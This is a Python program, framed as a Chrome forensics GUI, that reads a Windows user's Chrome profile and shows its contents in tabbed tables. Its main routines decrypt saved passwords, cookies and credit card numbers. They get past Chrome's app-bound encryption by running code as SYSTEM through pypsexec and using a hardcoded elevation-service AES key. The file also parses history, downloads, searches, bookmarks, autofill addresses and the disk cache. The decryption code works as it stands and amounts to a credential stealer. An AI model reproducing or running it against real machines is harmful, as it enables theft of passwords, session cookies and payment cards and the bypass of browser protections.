import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import sqlite3
import csv
import datetime
import sys
import timeit
from pypsexec.client import Client
import pathlib
import binascii

from struct import unpack # upack from buffer -> returns tuple
import copy
import re

from customtkinter import *
from tkinter import ttk
from tkinter import *



class Block:
    # /net/disk_cache/blockfile/disk_format.h
    # line 58
    index_MAGIC = 0xC103CAC3
    INDEX = 0
    # /net/disk_cache/blockfile/disk_format_base.h
    # line 31
    block_MAGIC = 0xC104CAC3
    BLOCK = 1

    def __init__(self, filename):
        self.filename = filename
        self.process_metadata()

    def process_metadata(self):
        header = open(self.filename, 'rb')

        # disk_cache/blockfile/disk_format_base.h -> line 48
        # disk_cache/blockfile/disk_format.h -> line 80
        # unpack unsigned integer "I" -> uint32_t
        m = unpack('I', header.read(4))[0]
        if m == Block.index_MAGIC:
            # skip b'\x00\x00' bytes
            header.seek(2, 1)
        
            # disk_cache/blockfile/disk_format.h
            # line 81 -> line 87
            self.block_type = Block.INDEX
            self.version = unpack('h', header.read(2))[0]
            self.num_entries = unpack('i', header.read(4))[0] # only works in versions 2.x
            self.total_bytes = unpack('i', header.read(4))[0]
            # last external file created
            self.last_file = 'f_{:06x}'.format(unpack('I', header.read(4))[0])
            header.seek(8, 1)
            # no. of entries -> atleast disk_cache::kIndexTablesize (65536)
            # actual size of the table controlled by -> table_len
            self.table_len = unpack('i', header.read(4))[0]
        else:
            raise Exception("Not a valid index")
        """
        elif m == Block.block_MAGIC:
            header.seek(2, 1)
            # A block-file is the file used to store information in blocks (could be
            # EntryStore blocks, RankingsNode blocks or user-data blocks).
            # We store entries that can expand for up to 4 consecutive blocks, and keep
            # counters of the number of blocks available for each type of entry. For
            # instance, an entry of 3 blocks is an entry of type 3. We also keep track of
            # where did we find the last entry of that type (to avoid searching the bitmap
            # from the beginning every time).
            # disk_cache/blockfile/disk_format_base.h 
            # line 47 -> 60
            self.block_type = Block.BLOCK
            self.version = unpack('h', header.read(2))[0]
            # index of this file
            self.this_file = unpack('h', header.read(2))[0]
            # index of next file, when this file is full
            self.next_file = unpack('h', header.read(2))[0]
            # size of the blocks of this file
            self.entry_size = unpack('I', header.read(4))[0]
            # number of stored entries
            self.num_entries = unpack('I', header.read(4))[0]
            # current maximum no. of entries 
            self.max_entries = unpack('I', header.read(4))[0]
            # counters of empty entries for each type
            self.empty = [unpack('I', header.read(4))[0] for _ in range(4)]
            # last used position for each entry type
            self.hints = [unpack('I', header.read(4))[0] for _ in range(4)]
        """
        header.close()

class Address:
    # cache address is simply a 32-bit number that describes exactly where the data is actually located
    # note:
    #    -> cache entry will have an address
    #    -> the HTTP headers will have another address
    #    -> the actual request data will have a different address
    #    -> the entry name (key) may have another address 
    #    -> Auxiliary information for the entry (such as the rankings info for the eviction algorithm) will have another address
    # disk_cache/blockfile/addr.h
    # line 20 -> 29
    SEPERATE_FILE = 0
    RANKING_BLOCK = 1
    BLOCK_256 = 2
    BLOCK_1024 = 3
    BLOCK_4096 = 4

    sizes = [0, 36, 256, 1024, 4096]

    def __init__(self, addr, path):
        if addr == 0:
            raise Exception("Null Pointer")
        
        self.addr = addr
        self.path = path
        self.build_name()
    
    
    def build_name(self):
        self.block_type = int(bin(self.addr)[3:6], 2)
        #print(bin(self.addr)[2:])
        #print(len(bin(self.addr)[2:]))

        # ref :- https://github.com/libyal/dtformats/blob/main/documentation/Chrome%20Cache%20file%20format.asciidoc#2-cache-address
        if self.block_type == Address.SEPERATE_FILE:
            # The value represents the value of # in f_######
            # 0ffset-0.0 28 bits
            self.file_name = 'f_{:06x}'.format(int(bin(self.addr)[6:], 2))
        elif self.block_type == Address.RANKING_BLOCK:
            self.file_name = 'data_'+str(int(bin(self.addr)[10:18], 2))
        else:
            self.entry_size = Address.sizes[self.block_type]
            # The number of contiguous blocks where 0 represents 1 block and 3 represents 4 blocks.
            # Offset-3.0 2 bits
            self.contiguous_block = int(bin(self.addr)[8:10], 2)
            # The value represents the value of # in data_#
            # Offset-2.0 8 bits
            self.file_name = 'data_' + str(int(bin(self.addr)[10:18], 2))
            # Block number
            # Offset-0.0 16 bits 
            self.block_num = int(bin(self.addr)[18:], 2)
        return None

class Data:
    HTTP_HEADER = 0
    OTHER = 1
    def __init__(self, address, size, ishttpheader=False):
        self.address = address
        self.size = size
        self.data_type = Data.OTHER
        #print(self.address.file_name)
        
        with open(os.path.join(self.address.path, self.address.file_name), 'rb') as data:
            if self.address.block_type == Address.SEPERATE_FILE:
                self.data = data.read()
            else:
                data.seek(8192 + self.address.block_num * self.address.entry_size)
                self.data = data.read(size)
        
        if ishttpheader and self.address.block_type != Address.SEPERATE_FILE:
            data_copy = copy.deepcopy(self.data)
            start = re.search(b'HTTP', data_copy)
            if start is None:
                return
            else:
                data_copy = data_copy[start.start():]

            end = re.search(b'\x00\x00', data_copy)
            if end is None:
                return
            else:
                data_copy = data_copy[:end.end()-2]
            
            self.data_type = Data.HTTP_HEADER
            self.headers = {}
            data_copy = data_copy.split(b'\x00')[1:]
            for line in data_copy:
                #print(line)
                temp = line.split(b':')
                v = b':'.join(temp[1:])
                v = v.decode(encoding='utf-8')
                #print(temp[0].decode(),':',v)
                k = temp[0].decode(encoding='utf-8').lower()
                self.headers[k] = v

class Entry:
    def __init__(self, address):
        with open(os.path.join(address.path, address.file_name), 'rb') as block:
            # skip header -> 8KB
            block.seek(8192 + address.block_num * address.entry_size)

            # disk_cache/blockfile/disk_format.h 

            # line 109 -> line 118
            # full hash of the key
            self.hash = unpack("I", block.read(4))[0]
            # next entry with the same hash/bucket
            self.next = unpack("I", block.read(4))[0]
            # rankings node for this entry
            self.rankings_node = unpack("I", block.read(4))[0]
            # how often this entry is used
            self.reuse_count = unpack("I", block.read(4))[0]
            # how often is  this fetched from the net
            self.refetch_count = unpack("I", block.read(4))[0]
            # current state
            """
            // Possible states for a given entry.
            ENTRY_NORMAL = 0,
            ENTRY_EVICTED,    // The entry was recently evicted from the cache.
            ENTRY_DOOMED      // The entry was doomed.
            """
            self.state = unpack("I", block.read(4))[0]

            self.creation_time = unpack("Q",block.read(8))[0]
            self.creation_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=self.creation_time)

            self.key_len = unpack("I", block.read(4))[0]
            # optional address of long key
            self.long_key = unpack("I", block.read(4))[0]
            # store up to 4 data streams for each entry 
            # array of data_stream sizes
            self.data_size = [unpack("I", block.read(4))[0] for _ in range(4)]
            # array of data stream cache addresses
            self.data = []
            for i in range(4):
                data_raw_addr = unpack("I", block.read(4))[0]
                try:
                    data_addr = Address(data_raw_addr, address.path)
                    self.data.append(Data(data_addr, self.data_size[i], True))
                except:
                    pass
            
            self.httpHeader = None
            for data in self.data:
                if data.data_type == Data.HTTP_HEADER:
                    self.httpHeader = data
                    break
            
            # flags that can be applied to an entry
            """
            flags
            PARENT_ENTRY = 1,         // This entry has children (sparse) entries.
            CHILD_ENTRY = 1 << 1      // Child entry that stores sparse data.
            """
            self.flags = unpack("I", block.read(4))[0]
            # skip paddding and self_hash - line 121 & 122
            block.seek(5*4, 1)

            if self.long_key == 0:
                self.key = block.read(self.key_len).decode('ascii')
            else:
                self.key = Data(Address(self.long_key, address.path), self.key_len, True)


class Chrome_Forensics:
    def __init__(self, base_path=None):
        self.base_path = base_path
        if self.base_path == None:
            self.base_path = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/")
        self.history_db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/History')
        self.master_key = self.get_master_key()
        self.init_v20()
    #-------------------------------------------------------------------------------------------------------------------------#
    # 
    # [[Utility]]
    def get_db_info(self, db_path):
        query = "SELECT * FROM sqlite_master WHERE type='table';"
        tables = self.exec_query(query=query, db_path=db_path)
        if tables:
            for table in tables:
                print(table,"\n","-"*60)
        
    def get_table_info(self, table_name, db_path):
        query = "SELECT sql FROM sqlite_schema WHERE name='"+table_name+"';"
        data = self.exec_query(query=query, db_path=db_path)
        data = str(data)
        data = data.split(",")
        for line in data:
            print(line)

    def get_master_key(self):
        local_state_file_path = self.base_path+'Local State'
        file_object = open(local_state_file_path, 'rb')
        local_state_data = file_object.read()
        file_object.close()
        local_state_data = local_state_data.decode('utf-8')
        local_state_data = json.loads(local_state_data)

        os_crypt = local_state_data['os_crypt']
        key_data = os_crypt['encrypted_key']
        key_data  = base64.b64decode(key_data)

        protected_data = key_data[5:]
        # remove leading string -> b'DPAPI'
        unprotected_data = win32crypt.CryptUnprotectData(protected_data)
        # CryptUnprotectData function decrypts and does an integrity check of the data 
        # in a DATA_BLOB structure. Usually, the only user who can decrypt the data is 
        # a user with the same logon credentials as the user who encrypted the data.
        master_key = unprotected_data[1]
        # 2nd string ->  key
        return master_key

    def decrypt_data(self, buffer):
        try:
            iv = buffer[3:15]
            encrypted_data = buffer[15:]
            cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
            decrypted_data = cipher.decrypt(encrypted_data)
            decrypted_data = decrypted_data[:-16]
            decrypted_data = decrypted_data.decode('utf-8')
            return decrypted_data
        except:
            iv = buffer[3:15]
            encrypted_value = buffer[15:-16]
            tag = buffer[-16:]
            cipher = AES.new(self.v20key, AES.MODE_GCM, nonce=iv)
            decrypted_cookie = cipher.decrypt_and_verify(encrypted_value, tag)
            return decrypted_cookie[32:].decode('utf-8')
    
    def init_v20(self):
        user_profile = os.environ['USERPROFILE']
        local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
        cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"

        with open(local_state_path, "r") as f:
            local_state = json.load(f)

        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]



        arguments = "-c \"" + """import win32crypt
        import binascii
        encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
        print(binascii.b2a_base64(encrypted_key[1]).decode())
        """.replace("\n", ";") + "\""


        c = Client("localhost")
        c.connect()

        try:
            c.create_service()

            assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
            app_bound_encrypted_key_b64 = binascii.b2a_base64(
                binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()


            # decrypt with SYSTEM DPAPI
            encrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=arguments.format(app_bound_encrypted_key_b64),
                use_system_account=True
            )


            # decrypt with user DPAPI
            decrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=arguments.format(encrypted_key_b64.decode().strip()),
                use_system_account=False
            )

            decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]

            assert(decrypted_key[0] == 1)

        finally:
            c.remove_service()
            c.disconnect()

        # decrypt key with AES256GCM
        # aes key from elevation_service.exe
        aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")


        iv = decrypted_key[1:1+12]
        ciphertext = decrypted_key[1+12:1+12+32]
        tag = decrypted_key[1+12+32:]
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        self.v20key = cipher.decrypt_and_verify(ciphertext, tag)

        
    def exec_query(self, query, db_path = None, list_mode = False):
        if not db_path:
            db_path = self.history_db
        try:
            connection = sqlite3.connect(db_path)
            cursor = connection.cursor()
            cursor.execute(query)
            if list_mode:
                data = []
                for line in cursor.fetchall():
                    data.append(line)
            else:
                data = cursor.fetchall()
            connection.close()
            return data
        except:
            return "ERROR"
        
    def date_from_webkit(self, timestamp):
        # convert webkit_timestamp to readable format
        epoch_start = datetime.datetime(1601,1,1)
        delta = datetime.timedelta(microseconds=int(timestamp))
        return epoch_start + delta
    #----------------------------------------------------------------------------------------------------------------------------#
    #
    # [[Encrypted]]
    def get_chrome_passwords(self):
        db_path = self.base_path + 'Default/Login Data'
        query = "SELECT action_url, origin_url, username_value, password_value FROM logins;"
        login_data = self.exec_query(query=query, db_path=db_path)

        ret_data = [["URL", "Username","Password"]]
        for row in login_data:
            action_url = row[0]
            origin_url = row[1]
            url = action_url if action_url else origin_url
            username = row[2]
            encrypted_password_buffer = row[3]
            decrypted_password = self.decrypt_data(buffer=encrypted_password_buffer)
            if len(decrypted_password) != 0:
                ret_data.append([url, username, decrypted_password])
                #print(url,"[+]",username,"[+]",decrypted_password)
        
        return ret_data
            
    def get_chrome_cookies(self):
        db_path = self.base_path + "Default/Network/Cookies"
        query = "SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;"
        cookiedb_data = self.exec_query(query=query, db_path=db_path)

        result_data = {}
        c = 1
        for row in cookiedb_data: 
            print(c)
            host_key = row[0]
            print(row[2])
            data = {
                'name' : row[1],
                'decrypted_value' : self.decrypt_data(row[2])
            }
            if host_key not in result_data:
                result_data[host_key] = []
            result_data[host_key].append(data)
        res_table = [["Host", "Name", "Value"]]
        for host, cookies in result_data.items():
            """         
            print("-"*60)
            print(f"Host: {host}")
            for cookie in cookies:
                print()
                for key, val in cookie.items():
                    try:
                        title = key.title().replace('_',' ')
                        print(f"{title}:{val}")
                    except:
                        pass
                print()
            """ 
            
            for cookie in cookies:
                res_table.append([host, cookie['name'], cookie['decrypted_value']])
        
        return res_table


    def get_credit_card_info(self):
        db_path = self.base_path + "Default/Web Data"
        query = "SELECT * FROM credit_cards;"
        data = self.exec_query(query=query, list_mode=True, db_path=db_path)
        ret_data = [["Card Number","Name","Expiry Date"]]
        for line in data:
            encrypted_card_number_blob = line[4]
            card_no = self.decrypt_data(encrypted_card_number_blob)
            name = line[1]
            expiry_date = str(line[2])+"/"+str(line[3])
            temp = [card_no, name, expiry_date]
            ret_data.append(temp)
        return ret_data
            #print(f"{card_no=}, {name=}, {expiry_date=}")
    #-----------------------------------------------------------------------------------------------------------------------------#
    # 
    # [[Plaintext]] 
    def get_navigation_history(self):
        query = "SELECT * FROM urls ORDER BY last_visit_time DESC;"
        query_oc_2 = "SELECT visits.visit_time, urls.url, urls.visit_count, urls.typed_count, urls.hidden FROM urls, visits WHERE urls.id = visits.url ORDER BY visits.visit_time DESC;"
        table_data = self.exec_query(query=query_oc_2)
        ret_data = [["time","url","count"]]
        for line in table_data:
            try:
                webkit_date = int(line[0])
                readable_date = self.date_from_webkit(webkit_date)
                ret_data.append([readable_date, line[1], line[2]])
            except:
                pass
        return ret_data
    
    def get_download_history(self):
        query = "SELECT * FROM downloads ORDER BY start_time;"
        table_data = self.exec_query(query=query, list_mode=True)
        ret_data = [["Path","Timestamp","Size","URL","MIME_type","Original MIME_type"]]
        for line in table_data:
            path = line[2]
            timestamp = self.date_from_webkit(int(line[4]))
            timestamp = str(timestamp.date())+" "+str(timestamp.time())

            size = line[5]
            tab_url = line[19]
            mime_type = line[25]
            original_mime_type = line[26]
            ret_data.append([path, timestamp, size, tab_url, mime_type,original_mime_type])
            #print(f"{path=},{timestamp=},{size=},{tab_url=},{mime_type=},{original_mime_type=},")
        return ret_data

    def get_google_search_history(self):
        query = "SELECT visits.visit_time, urls.url, keyword_search_terms.term FROM urls, visits, keyword_search_terms WHERE urls.id = keyword_search_terms.url_id AND urls.id = visits.url ORDER BY visits.visit_time DESC;"
        table_data = self.exec_query(query=query)
        ret_data = [["Date","URL","Search Term"]]
        for line in table_data:
            temp = []
            try:
                readable_date = self.date_from_webkit(int(line[0]))
                temp.append(readable_date)
                temp.append(line[1])
                temp.append(line[2])
                #print(readable_date, end="==>")
                #print(line[1:])
            except:
                pass
            ret_data.append(temp)
        return ret_data

    def recurse_bookmarks_children(self, child, folder=None):

        for object in child:
            if 'children' in object.keys():
                parent = object["name"]
                if folder:
                    parent = folder+"/"+parent
                self.recurse_bookmarks_children(object['children'],folder=parent)
            else:
                """
                ret_data = {
                    "parent-folder-path":str(folder) if folder else "Orphan",
                    "date_added":str(self.date_from_webkit(object['date_added'])),
                    "date_last_used":str(self.date_from_webkit(object['date_last_used'])),
                    "name":object['name'],
                    "url":object['url']
                }
                """
                date_added = self.date_from_webkit(object['date_added'])
                date_last_used = self.date_from_webkit(object['date_added'])
                ret_data = [str(folder) if folder else "Orphan",
                            str(date_added.date()) +"  "+ str(date_added.time()),
                            str(date_last_used.date()) +"  "+ str(date_last_used.time()),
                            object['name'],
                            object['url']]
                self.all_bookmarks.append(ret_data)
        return None
    
    def get_bookmarks(self):
        file = self.base_path + 'Default/Bookmarks'
        fobj = open(file, 'rb')
        data = fobj.read()
        data = data.decode()
        data = json.loads(data)
        fobj.close()
        self.all_bookmarks = [["parent-folder","date_added","date_last_used","name","url"]] # list of dict objects ( dict for each bookmark)
        for key in data['roots'].keys():
            bookmark_type = data['roots'][key]['name']
            date_added = data['roots'][key]['date_added']
            #print(bookmark_type," ",self.date_from_webkit(date_added),"\n")
            if len(data['roots'][key]['children']) == 0:
                #print("No Bookmarks")
                continue
            self.recurse_bookmarks_children(data['roots'][key]['children'])
        return self.all_bookmarks
        for bookmark in self.all_bookmarks:
            print(bookmark)
        return None
    
    def get_autofill_address_info(self):
        db_path = self.base_path + "Default/Web Data"
        query = "SELECT * FROM contact_info"
        table_data = self.exec_query(db_path=db_path, query=query, list_mode=True)
        ret_data = [["name", "email", "phone", "town_city", "state", "pin", "country_region", "organisation", "street_address"]]
        for line in table_data:
            guid = str(line[0])
            query = "SELECT value FROM contact_info_type_tokens WHERE guid='"+guid+"';"
            autofill = self.exec_query(db_path=db_path, query=query, list_mode=False)
            temp = []
            name = autofill[3]
            email = autofill[4]
            phone = autofill[5]
            town_city = autofill[7]
            state = autofill[8]
            pin = autofill[9]
            country_region = autofill[10]
            organisation = autofill[12]
            street_address = autofill[13]
            temp = [name, email, phone, town_city, state, pin, country_region, organisation, street_address]
            ret_data.append(temp)
        return ret_data

    def get_top_sites(self):
        db_path = self.base_path + "Default/Top Sites"
        query = "SELECT * FROM top_sites ORDER BY url_rank ASC;"
        table_data = self.exec_query(db_path=db_path, query=query, list_mode=True)
        ret_data = [["URL","RANK","TITLE"]]
        for row in table_data:
            temp = []
            for obj in row:
                temp.append(obj)
            ret_data.append(temp)
        return ret_data
    
    #-----------------------------------------------------------------------------------------------------------------------------#
    # 
    # [[Cache]]
    def cache_parse(self):

        cache_path = self.base_path + "Default/Cache/Cache_Data/"

        # index file -> main hash table
        # used to locate entries on the cache
        index_file_path = os.path.join(cache_path, "index")
        # create an object of Block to parse
        # the header of the index file
        index_cache_obj = Block(index_file_path)        
        if index_cache_obj.block_type != Block.INDEX:
            raise Exception("Not a valid [index] file")
        
        with open(index_file_path, 'rb') as index:
            index.seek(92*4)
            cache = []
            for key in range(index_cache_obj.table_len):
                raw = unpack('I', index.read(4))[0]
                if raw != 0:
                    entry = Entry(Address(raw, cache_path))
                    cache.append(entry) 
                    while entry.next != 0:
                        entry = Entry(Address(entry.next, cache_path))
                        cache.append(entry)
        
        c = 0
        for entry in cache:
            for i, d in enumerate(entry.data):
                if d is not entry.httpHeader:
                    type = "unknown"
                    if entry.httpHeader is not None:
                        try:
                            type = entry.httpHeader.headers['content-type'].split(';')[0].strip()
                        except:
                            pass
                    name = hex(entry.hash) + '_' + str(i)
                    # write out parsed data streams
                    data_path = os.path.join("parsed cache", type, name)
                    os.makedirs(os.path.dirname(data_path), exist_ok=True)
                    with open(data_path, 'wb') as obj:
                        obj.write(d.data)
            # parse out the HTTP headers
            if entry.httpHeader is not None:
                try:
                    name = hex(entry.hash) + ".http_header"
                    type = entry.httpHeader.headers['content-type'].split(';')[0].strip()
                    header_path = os.path.join("parsed cache", type, name)
                    os.makedirs(os.path.dirname(header_path), exist_ok=True)
                    with open(header_path, 'w') as http_header_file:
                        for key, value in entry.httpHeader.headers.items():
                            http_header_file.write("{}: {}\n".format(key, value))
                    
                except:
                    pass
                    

#-------------------------------DISPLAY GUI------------------------------------------#
class Rep_Table():
    def __init__(self):
        pass



class Forensic_View():
    def __init__(self):
        self.app = CTk()
        self.app.geometry("1200x600")
        self.app.columnconfigure(0, weight=1)
        self.app.rowconfigure(0, weight=1)
        self.app.title("Chrome Forensics")
        self.app.resizable(False, False)
        
        self.tabview = CTkTabview(master=self.app, segmented_button_selected_color="#08131f")
        self.tabview.pack(fill=BOTH)

        self.data_obj = Chrome_Forensics()
    
    def search_view(self, source_key, source_index):
        search_term = self.search_field_objects[source_key].get()
        response = []
        comp_string = ""
        for char in str(search_term):
            if char==".":
                comp_string += "\\."
            else:
                comp_string += char

        pattern = re.compile(".*"+str(comp_string)+".*")
        print(comp_string ," -> ", source_key)
        for line in self.data_list[source_index]:
            for obj in line:
                if pattern.match(str(obj)):
                    response.append(line)
                    break
        
        for i in self.table_objects_dict[source_key].get_children():
            self.table_objects_dict[source_key].delete(i)
        self.app.update()

        for row in response:
            try:
                self.table_objects_dict[source_key].insert('','end',values=row)
            except:
                pass


    def add_tab_views(self, sources_dict):
        self.data_list = []

        # Create a Tab for each key in the source list
        for index, key in enumerate(sources_dict):
            self.tabview.add(key)
            source_name = "get_" + sources_dict[key]
            try:
                data = getattr(self.data_obj, source_name)() # returns list of lists
            except:
                data = ["Placeholder"]
            if data == None or len(data) == 0:
                print(data)
                print(key)
                sys.exit(0)
            self.data_list.append(data)
            print("[+] Recevied " + key)
        
        # Create a FRAME to prevent overlap
        self.table_frames = {}
        # Create a "table" objects for each key
        self.table_objects_dict = {}
        # Create "scrollbar" objects for each key
        scrollbar_objects_vertical_dict = {}
        scrollbar_objects_horizontal_dict = {}
        # Create search funcs for each key
        self.search_field_objects = {}
        search_button_objects = {}
        for index, key in enumerate(sources_dict):

            if index >= len(self.data_list):
                break

            self.table_frames[key] = CTkFrame(master=self.tabview.tab(key))
            self.table_frames[key].pack(expand=True, fill="both")

            # TreeView TABLE object
            column_identifiers = (0,)
            for i in range(len(self.data_list[index][0])):
                column_identifiers += (i+1,)
            self.table_objects_dict[key] = ttk.Treeview(master=self.table_frames[key],
                                                   columns = column_identifiers[1:],
                                                   show = 'headings')
            
            # POPULATE the table header
            for i, head_val in enumerate(self.data_list[index][0]):
                self.table_objects_dict[key].heading(i+1, text=head_val)
            
            # POPULATE data cells
            for row in self.data_list[index][1:]:
                try:
                   self.table_objects_dict[key].insert('','end',values=row)
                except:
                    pass
            
            # initialize the table
            self.table_objects_dict[key].pack(expand=True, fill="both")
            
            # scrollbar for each object
            scrollbar_objects_vertical_dict[key] = ttk.Scrollbar(master=self.table_frames[key],
                                            orient = 'vertical',
                                            command = self.table_objects_dict[key].yview)
            self.table_objects_dict[key].configure(yscrollcommand=scrollbar_objects_vertical_dict[key].set)
            scrollbar_objects_vertical_dict[key].place(relx = 1,
                                  rely = 0,
                                  relheight = 1,
                                  anchor = 'ne')
            scrollbar_objects_horizontal_dict[key] = ttk.Scrollbar(master=self.table_frames[key],
                                            orient = 'horizontal',
                                            command = self.table_objects_dict[key].xview)
            self.table_objects_dict[key].configure(xscrollcommand=scrollbar_objects_horizontal_dict[key].set)
            scrollbar_objects_horizontal_dict[key].place(relx = 0,
                                  rely = 1,
                                  relwidth = 1,
                                  anchor = 'sw')

            # SEARCH
            
            self.search_field_objects[key] = CTkEntry(master=self.tabview.tab(key), width=1000)
            search_button_objects[key] = CTkButton(master=self.tabview.tab(key),text="search",command=lambda key=key, index=index :self.search_view(key,index))
            
            self.search_field_objects[key].pack(pady=10,                                                
                                                side="left",
                                                anchor="s",
                                                fill="x")
            search_button_objects[key].pack(pady=10,
                                            side="left",
                                            anchor="s",
                                            fill="x")


    def run(self):
        source_list = {"Login Data":"chrome_passwords",
                       "Browser Cookies":"chrome_cookies",
                       "Credit Card Data":"credit_card_info",
                       "Navigation":"navigation_history",
                       "Downloads":"download_history",
                       "Searches":"google_search_history",
                       "Bookmarks":"bookmarks",
                       "Autofill Address":"autofill_address_info",
                       "Top Sites":"top_sites"}
        
        test_list = {"Bookmarks":"bookmarks"}
        #self.data_obj.cache_parse()
        self.add_tab_views(source_list)
        self.app.mainloop()


obj = Forensic_View()
obj.run()